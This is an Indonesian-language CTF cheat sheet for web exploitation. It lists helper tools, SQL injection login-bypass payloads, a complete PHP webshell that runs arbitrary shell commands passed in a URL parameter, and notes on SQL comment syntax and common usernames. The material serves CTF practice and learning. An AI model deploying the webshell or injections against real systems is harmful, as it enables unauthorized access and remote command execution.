---
title: Semua Tentang CTF - Kategori Web Exploitation
published: true
---
# Tools Yang Umum Digunakan
Kategori Web Exploitation:
1. [JWT (JSON Web Token)](https://token.dev/)
2. [Deobfuscate Kode JS](https://deobfuscate.io/)

# Kode Penting
SQL Injection
```sql
' OR 1=1--
```

Modified SQL Injection (by me)
```sql
' OR 1=1 OR '1'='1
```
PHP Webshell (Execute Linux Command) dari [joswr1ght](gist.github.com/joswr1ght).

```php
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd'] . ' 2>&1');
    }
?>
</pre>
</body>
</html>
```

# Catatan Tambahan Untuk Belajar
## Comment Pada SQL
```sql
SELECT * FROM Customers -- WHERE City='Berlin';
```
```sql
/*Select all the columns
of all the records
in the Customers table:*/
SELECT * FROM Customers;
```
```sql
SELECT CustomerName, /*City,*/ Country FROM Customers;
```
## Username yang Umum Digunakan
```admin``` paling umum digunakan.